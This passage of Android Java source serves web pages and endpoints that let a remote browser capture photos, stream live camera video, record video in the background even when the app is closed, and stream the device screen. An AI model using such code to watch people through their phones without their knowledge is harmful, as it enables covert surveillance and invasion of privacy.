                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant camera permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // List available cameras using CameraHelper
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();

        if (cameras.isEmpty()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div>");
            html.append("<p>No cameras available</p>");
            html.append("</div>");
        } else {
            // Photo Capture Section
            html.append("<div class=\"info-section\">");
            html.append("<h3 style=\"color: #3498db; margin-bottom: 15px;\">&#128247; Photo Capture</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Tap to capture a photo from the selected camera</p>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128247;";
                String bgColor = cam.facing.equals("Front") ? "rgba(0, 242, 255, 0.1)" : "rgba(52, 152, 219, 0.2)";
                String borderColor = cam.facing.equals("Front") ? "rgba(0, 242, 255, 0.3)" : "rgba(52, 152, 219, 0.3)";
                String textColor = cam.facing.equals("Front") ? "#00f2ff" : "#3498db";

                html.append("<a href=\"/camera/capture?cam=").append(cam.id).append("\" ");
                html.append("style=\"padding: 25px 20px; background: ").append(bgColor).append("; ");
                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
                html.append("border: 1px solid ").append(borderColor).append("; display: block;\">");
                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
                html.append("<div style=\"color: ").append(textColor).append("; font-weight: 600;\">")
                        .append(cam.facing).append(" Camera</div>");
                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">")
                        .append(cam.width).append(" x ").append(cam.height).append("</div>");
                html.append("</a>");
            }
            html.append("</div>");
            html.append("</div>");

            // Live Streaming Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px;\">&#128249; Live Streaming</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">View live camera feed in your browser</p>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128249;";
                html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" ");
                html.append("style=\"padding: 25px 20px; background: rgba(231, 76, 60, 0.2); ");
                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
                html.append("border: 1px solid rgba(231, 76, 60, 0.3); display: block;\">");
                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
                html.append("<div style=\"color: #e74c3c; font-weight: 600;\">Live ").append(cam.facing)
                        .append("</div>");
                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">Click for stream</div>");
                html.append("</a>");
            }
            html.append("</div>");
            html.append("</div>");

            // Video Recording Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: #27ae60; margin-bottom: 15px;\">&#127909; Background Video Recording</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Record video in background - works even when app is closed</p>");
            html.append(
                    "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; color: #888;\">Checking status...</div>");
            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                html.append("<button onclick=\"startRecording('").append(cam.id).append("')\" ");
                html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #27ae60, #2ecc71); ");
                html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
                html.append("&#127909; Record ").append(cam.facing);
                html.append("</button>");
            }

            html.append("<button onclick=\"stopRecording()\" ");
            html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #e74c3c, #c0392b); ");
            html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
            html.append("&#9632; Stop Recording");
            html.append("</button>");
            html.append("</div>");

            // JavaScript for recording
            html.append("<script>");
            html.append("function startRecording(camId) {");
            html.append("  fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording from camera ' + camId + '...</span>';");
            html.append("  });");
            html.append("}");
            html.append("function stopRecording() {");
            html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #27ae60;\">Recording stopped. ' + (d.path || '') + '</span>';");
            html.append("  });");
            html.append("}");
            html.append("function checkRecStatus() {");
            html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
            html.append("    if (d.recording) {");
            html.append(
                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording in progress (' + d.duration + 's)</span>';");
            html.append("    } else {");
            html.append(
                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">Not recording</span>';");
            html.append("    }");
            html.append("  });");
            html.append("}");
            html.append("checkRecStatus();");
            html.append("setInterval(checkRecStatus, 2000);");
            html.append("</script>");

            html.append("</div>");

            // Screen Projection Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: var(--neon-cyan); margin-bottom: 15px;\">&#128241; Remote Screen Projection</h3>");
            html.append("<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Stream the live device screen (Requires user consent on phone)</p>");
            
            html.append("<div style=\"text-align: center; margin-bottom: 20px;\">");
            html.append("<div id=\"screen-container\" style=\"position: relative; display: inline-block; background: #000; border: 1px solid var(--neon-cyan); border-radius: 10px; overflow: hidden; min-height: 200px; width: 300px;\">");
            html.append("<img id=\"screen-stream\" src=\"\" style=\"max-width: 100%; height: auto; display: block;\" />");
            html.append("<div id=\"screen-status\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #888;\">OFFLINE</div>");
            html.append("</div></div>");

            html.append("<div style=\"display: flex; gap: 10px; justify-content: center;\">");
            html.append("<button onclick=\"startScreen()\" class=\"btn\">START_PROJECTION</button>");
            html.append("<button onclick=\"stopScreen()\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger);\">STOP</button>");
            html.append("</div>");

            html.append("<script>");
            html.append("var screenActive = false;");
            html.append("function startScreen() {");
            html.append("  fetch('/camera/screen-start').then(r => r.json()).then(d => {");
            html.append("    screenActive = true; document.getElementById('screen-status').innerHTML = 'WAITING_FOR_CONSENT...';");
            html.append("    refreshScreen();");
            html.append("  });");
            html.append("}");
            html.append("function stopScreen() { screenActive = false; document.getElementById('screen-status').innerHTML = 'OFFLINE'; document.getElementById('screen-stream').src = ''; }");
            html.append("function refreshScreen() {");
            html.append("  if (!screenActive) return;");
            html.append("  const img = document.getElementById('screen-stream');");
            html.append("  img.src = '/camera/screen-frame?t=' + Date.now();");
            html.append("  img.onload = () => { document.getElementById('screen-status').style.display = 'none'; };");
            html.append("  setTimeout(refreshScreen, 1000);");
            html.append("}");
            html.append("</script>");
            html.append("</div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveCameraCapture(Map<String, String> params) {
        String cameraId = params.get("cam");
        logActivity("OPTICS_TRIGGER: Capture command sent to camera " + (cameraId != null ? cameraId : "0"));
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0"; // Default to back camera
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Capturing Photo...</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        try {
            CameraHelper cameraHelper = new CameraHelper(context);
            byte[] imageData = cameraHelper.capturePhoto(cameraId);

            if (imageData != null && imageData.length > 0) {
                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);

                html.append("<div style=\"text-align: center;\">");
                html.append("<img src=\"data:image/jpeg;base64,").append(base64Image).append("\" ");
                html.append("style=\"max-width: 100%; height: auto; border-radius: 10px; margin-bottom: 20px;\" />");
                html.append("</div>");

                html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
                html.append(
                        "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("<a href=\"/camera/photo?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">&#8595; Download Photo</a>");
                html.append("<a href=\"/camera/capture?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(0, 242, 255, 0.1); border-radius: 10px; color: #00f2ff; text-decoration: none;\">&#128247; Capture Again</a>");
                html.append("</div>");

            } else {
                String error = cameraHelper.getLastError();
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
                html.append("<p>Failed to capture photo</p>");
                if (error != null) {
                    html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">")
                            .append(escapeHtml(error)).append("</p>");
                }
                html.append(
                        "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("</div>");
            }

        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error: ").append(escapeHtml(e.getMessage())).append("</p>");
            html.append(
                    "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
            html.append("</div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveCameraPhoto(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0";
        }

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return serveError("Camera permission not granted");
            }
        }

        try {
            CameraHelper cameraHelper = new CameraHelper(context);
            byte[] imageData = cameraHelper.capturePhoto(cameraId);

            if (imageData != null && imageData.length > 0) {
                java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
                Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, imageData.length);
                response.addHeader("Content-Disposition",
                        "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
                return response;
            } else {
                String error = cameraHelper.getLastError();
                return serveError(error != null ? error : "Failed to capture photo");
            }

        } catch (Exception e) {
            return serveError("Error capturing photo: " + e.getMessage());
        }
    }

    // ============ LIVE STREAMING ============

    private Response serveLiveStreamPage(Map<String, String> params) {
        String camId = params.get("cam");
        if (camId == null)
            camId = "0";

        // Get resolution from params, default to "low" for mobile data optimization
        String res = params.get("res");
        if (res == null)
            res = "low";

        // Resolution presets optimized for different network speeds
        int width, height, quality, fps;
        String resLabel;
        switch (res) {
            case "ultra_low":
                width = 160;
                height = 120;
                quality = 20;
                fps = 2;
                resLabel = "Ultra Low (160x120)";
                break;
            case "very_low":
                width = 240;
                height = 180;
                quality = 25;
                fps = 3;
                resLabel = "Very Low (240x180)";
                break;
            case "low":
            default:
                width = 320;
                height = 240;
                quality = 30;
                fps = 5;
                resLabel = "Low (320x240) - DEFAULT";
                break;
            case "medium":
                width = 480;
                height = 360;
                quality = 40;
                fps = 8;
                resLabel = "Medium (480x360)";
                break;
            case "high":
                width = 640;
                height = 480;
                quality = 50;
                fps = 10;
                resLabel = "High (640x480)";
                break;
            case "very_high":
                width = 800;
                height = 600;
                quality = 60;
                fps = 12;
                resLabel = "Very High (800x600)";
                break;
            case "hd":
                width = 1280;
                height = 720;
                quality = 70;
                fps = 15;
                resLabel = "HD (1280x720)";
                break;
        }

        int refreshRate = 1000 / fps; // Convert FPS to milliseconds

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128249; Live Camera Stream</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Network info banner
        html.append(
                "<div style=\"background: rgba(52, 152, 219, 0.2); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; text-align: center;\">");
        html.append("<span style=\"color: #3498db; font-size: 0.85rem;\">&#128246; Current: ").append(resLabel);
        html.append(" | ~").append(quality * width * height / 8000).append(" KB/frame</span>");
        html.append("</div>");

        // Live stream viewer
        html.append("<div style=\"text-align: center; margin-bottom: 20px;\">");
        html.append(
                "<div id=\"stream-container\" style=\"position: relative; display: inline-block; background: #000; border-radius: 10px; overflow: hidden; min-height: 180px;\">");
        html.append(
                "<img id=\"stream\" src=\"/camera/frame\" style=\"max-width: 100%; height: auto; display: block; transition: transform 0.3s ease;\" ");
        html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
        html.append(
                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem;\">");
        html.append("<span id=\"stream-status\" style=\"color: #2ecc71;\">&#9679; LIVE</span>");
        html.append("<span id=\"fps-counter\" style=\"color: #888; margin-left: 10px;\"></span>");
        html.append("</div>");
        html.append(
                "<div id=\"loading\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff;\">Loading...</div>");
        html.append(
                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; display: none;\">");
        html.append("<span style=\"color: #fff;\">&#9679; REC</span>");
        html.append("</div>");
        html.append("</div>");
        html.append("</div>");

        // Resolution selector
        html.append("<div style=\"margin-bottom: 20px; text-align: center;\">");
        html.append(
                "<h4 style=\"color: #888; margin-bottom: 10px; font-size: 0.9rem;\">&#128246; Resolution (for slow internet, choose lower)</h4>");
        html.append("<div style=\"display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;\">");

        String[] resOptions = { "ultra_low", "very_low", "low", "medium", "high", "very_high", "hd" };
        String[] resNames = { "Ultra Low", "Very Low", "Low", "Medium", "High", "Very High", "HD" };
        for (int i = 0; i < resOptions.length; i++) {
            String selected = resOptions[i].equals(res) ? "background: #00f2ff; color: #050505;"
                    : "background: rgba(255,255,255,0.1);";
            html.append("<a href=\"/camera/live?cam=").append(camId).append("&res=").append(resOptions[i])
                    .append("\" ");
            html.append("style=\"padding: 8px 12px; ").append(selected)
                    .append(" border-radius: 6px; color: #fff; text-decoration: none; font-size: 0.8rem;\">");
            html.append(resNames[i]);
            html.append("</a>");
        }
        html.append("</div>");
        html.append("</div>");

        // Camera selection
        html.append(
                "<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 20px;\">");
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
        for (CameraHelper.CameraInfo cam : cameras) {
            String selected = cam.id.equals(camId) ? "background: #00f2ff; color: #050505;" : "";
            html.append("<a href=\"/camera/live?cam=").append(cam.id).append("&res=").append(res).append("\" ");
            html.append(
                    "style=\"padding: 10px 20px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; ")
                    .append(selected).append("\">");
            html.append(cam.facing).append(" Camera");
            html.append("</a>");
        }
        html.append("</div>");

        // Action buttons
        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
        html.append(
                "<button onclick=\"triggerFlash()\" style=\"padding: 12px 24px; background: rgba(255, 255, 0, 0.2); border: 1px solid #ffff00; border-radius: 10px; color: #ffff00; font-weight: 600; cursor: pointer;\">&#9889; Blink Flash</button>");
        html.append(
                "<button onclick=\"rotateStream()\" style=\"padding: 12px 24px; background: rgba(243, 156, 18, 0.2); border: 1px solid #f39c12; border-radius: 10px; color: #f39c12; font-weight: 600; cursor: pointer;\">&#8635; Rotate 90&deg;</button>");
        html.append(
                "<button onclick=\"capturePhoto()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #3498db, #2980b9); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#128247; Capture Photo</button>");
        html.append(
                "<button id=\"rec-btn\" onclick=\"toggleRecording()\" style=\"padding: 12px 24px; background: linear-gradient(135deg, #e74c3c, #c0392b); border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">&#9679; Start Recording</button>");
        html.append(
                "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(255,255,255,0.1); border-radius: 10px; color: #fff; text-decoration: none;\">&#8592; Back</a>");
        html.append("</div>");

        // Status
        html.append(
                "<div id=\"status\" style=\"text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;\"></div>");

        // JavaScript for live stream with optimizations
        html.append("<script>");
        html.append("var camId = '").append(camId).append("';");
        html.append("var streamWidth = ").append(width).append(";");
        html.append("var streamHeight = ").append(height).append(";");
        html.append("var streamQuality = ").append(quality).append(";");
        html.append("var refreshRate = ").append(refreshRate).append(";");
        html.append("var isRecording = false;");
        html.append("var streamImg = document.getElementById('stream');");
        html.append("var loadingDiv = document.getElementById('loading');");
        html.append("var fpsCounter = document.getElementById('fps-counter');");
        html.append("var frameCount = 0;");
        html.append("var lastFpsTime = Date.now();");
        html.append("var errorCount = 0;");
        html.append("var streamActive = true;");
        html.append("var currentRotation = 0;");

        // Rotate stream function
        html.append("function rotateStream() {");
        html.append("  currentRotation = (currentRotation + 90) % 360;");
        html.append("  streamImg.style.transform = 'rotate(' + currentRotation + 'deg)';");
        html.append("}");

        html.append("function triggerFlash() {");
        html.append("  fetch('/camera/flash').then(r => r.json()).then(d => {");
        html.append("    document.getElementById('status').innerHTML = d.message;");
        html.append("    setTimeout(() => { document.getElementById('status').innerHTML = ''; }, 3000);");
        html.append("  });");
        html.append("}");

        // Start streaming with current resolution
        html.append("function startStream() {");
        html.append(
                "  fetch('/camera/start-stream?cam=' + camId + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality);");
        html.append("  setTimeout(refreshFrame, 1000);");
        html.append("}");

        // Handle stream load success
        html.append("function streamLoaded() {");
        html.append("  loadingDiv.style.display = 'none';");
        html.append("  errorCount = 0;");
        html.append("  frameCount++;");
        html.append("  var now = Date.now();");
        html.append("  if (now - lastFpsTime >= 1000) {");
        html.append("    fpsCounter.innerHTML = frameCount + ' fps';");
        html.append("    frameCount = 0;");
        html.append("    lastFpsTime = now;");
        html.append("  }");
        html.append("}");

        // Handle stream error with retry
        html.append("function handleStreamError() {");
        html.append("  errorCount++;");
        html.append("  if (errorCount < 10) {");
        html.append("    setTimeout(function() { streamImg.src = '/camera/frame?t=' + Date.now(); }, 500);");
        html.append("  } else {");
        html.append(
                "    loadingDiv.innerHTML = 'Stream error. <a href=\"javascript:location.reload()\" style=\"color:#e94560\">Reload</a>';");
        html.append("  }");
        html.append("}");

        // Refresh frame with adaptive timing
        html.append("function refreshFrame() {");
        html.append("  if (!streamActive) return;");
        html.append("  streamImg.src = '/camera/frame?t=' + Date.now();");
        html.append("  setTimeout(refreshFrame, refreshRate);");
        html.append("}");

        // Capture photo
        html.append("function capturePhoto() {");
        html.append("  window.open('/camera/photo?cam=' + camId, '_blank');");
        html.append("}");

        // Toggle recording
        html.append("function toggleRecording() {");
        html.append("  var btn = document.getElementById('rec-btn');");
        html.append("  var indicator = document.getElementById('rec-indicator');");
        html.append("  if (isRecording) {");
        html.append("    fetch('/camera/stop-record').then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9679; Start Recording';");
        html.append("      btn.style.background = 'linear-gradient(135deg, #e74c3c, #c0392b)';");
        html.append("      indicator.style.display = 'none';");
        html.append("      isRecording = false;");
        html.append("    });");
        html.append("  } else {");
        html.append("    fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9632; Stop Recording';");
        html.append("      btn.style.background = 'linear-gradient(135deg, #27ae60, #2ecc71)';");
        html.append("      indicator.style.display = 'block';");
        html.append("      isRecording = true;");
        html.append("    });");
        html.append("  }");
        html.append("}");

        // Check status
        html.append("function checkStatus() {");
        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
        html.append("    if (d.recording) {");
        html.append("      document.getElementById('rec-indicator').style.display = 'block';");
        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; Stop Recording';");
        html.append("      isRecording = true;");
        html.append("    }");
        html.append("  }).catch(e => {});");
        html.append("}");

        // Stop stream when leaving page
        html.append("window.onbeforeunload = function() { streamActive = false; };");

        html.append("startStream();");
        html.append("checkStatus();");
        html.append("</script>");

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveMJPEGStream(Map<String, String> params) {
        // Start stream if not already - use low resolution by default for mobile data
        if (!CameraService.isCurrentlyStreaming()) {
            String camId = params.get("cam");
            // Default to 320x240 with low quality for mobile data compatibility
            startCameraStreamInternal(camId != null ? camId : "0", 320, 240, 30);
            try {
                Thread.sleep(800); // Give more time for camera to start
            } catch (InterruptedException e) {
            }
        }

        // Return single frame for simplicity (MJPEG multipart is complex with
        // NanoHTTPD)
        return serveSingleFrame();
    }

    private Response serveSingleFrame() {
        byte[] frame = CameraService.getNextFrame(200);
        if (frame != null && frame.length > 0) {
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
            return response;
        } else {
            // Return a 1x1 transparent pixel as fallback
            byte[] pixel = new byte[] {
                    (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0x00, 0x10, 0x4A, 0x46,
                    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                    (byte) 0xFF, (byte) 0xDB, 0x00, 0x43, 0x00, 0x08, 0x06, 0x06, 0x07, 0x06,
                    0x05, 0x08, 0x07, 0x07, 0x07, 0x09, 0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D,
                    0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12, 0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F,
                    0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20, 0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C,
                    0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29, 0x2C, 0x30, 0x31, 0x34, 0x34, 0x34,
                    0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32, 0x3C, 0x2E, 0x33, 0x34, 0x32,
                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01,
                    0x01, 0x11, 0x00, (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01,
                    0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
                    0x0A, 0x0B, (byte) 0xFF, (byte) 0xC4, 0x00, (byte) 0xB5, 0x10, 0x00, 0x02,
                    0x01, 0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00,
                    0x01, 0x7D, (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
                    0x3F, 0x00, 0x7F, (byte) 0xFF, (byte) 0xD9
            };
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(pixel);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, pixel.length);
            response.addHeader("Cache-Control", "no-cache");
            return response;
        }
    }

    private Response startCameraStream(Map<String, String> params) {
        String camId = params.get("cam");
        logActivity("OPTICS_UPLINK: Live stream started on camera " + (camId != null ? camId : "0"));
        String widthStr = params.get("width");
        String heightStr = params.get("height");
        String qualityStr = params.get("quality");

        int width = 640, height = 480, quality = 50;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
            if (qualityStr != null)
                quality = Integer.parseInt(qualityStr);
        } catch (Exception e) {
        }

        startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);

        String json = "{\"success\": true, \"message\": \"Stream started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private void startCameraStreamInternal(String camId, int width, int height, int quality) {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("START_STREAM");
        intent.putExtra("cameraId", camId);
        intent.putExtra("width", width);
        intent.putExtra("height", height);
        intent.putExtra("quality", quality);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    private Response stopCameraStream() {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("STOP_STREAM");
        context.startService(intent);

        String json = "{\"success\": true, \"message\": \"Stream stopped\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response startVideoRecording(Map<String, String> params) {
        String camId = params.get("cam");
        String widthStr = params.get("width");
        String heightStr = params.get("height");

        int width = 1280, height = 720;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
        } catch (Exception e) {
        }

        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("START_RECORDING");
        intent.putExtra("cameraId", camId != null ? camId : "0");
        intent.putExtra("width", width);
        intent.putExtra("height", height);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Recording started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopVideoRecording() {
        android.content.Intent intent = new android.content.Intent(context, CameraService.class);
        intent.setAction("STOP_RECORDING");
        context.startService(intent);

        String videoPath = CameraService.getCurrentVideoPath();
        String json = "{\"success\": true, \"message\": \"Recording stopped\"" +
                (videoPath != null ? ", \"path\": \"" + videoPath + "\"" : "") + "}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response serveCameraStatus() {
        boolean streaming = CameraService.isCurrentlyStreaming();
        boolean recording = CameraService.isCurrentlyRecording();
        String currentCamera = CameraService.getCurrentCameraId();
        long duration = CameraService.getRecordingDuration();
        String videoPath = CameraService.getCurrentVideoPath();

        String json = String.format(
                "{\"streaming\": %s, \"recording\": %s, \"camera\": \"%s\", \"duration\": %d, \"videoPath\": %s, \"screenShare\": %s}",
                streaming, recording, currentCamera, duration,
                videoPath != null ? "\"" + videoPath + "\"" : "null",
                ScreenShareService.isStreaming());
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response serveScreenFrame() {
        byte[] frame = ScreenShareService.getNextFrame();
        if (frame != null && frame.length > 0) {
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
            response.addHeader("Cache-Control", "no-cache");
            return response;
        }
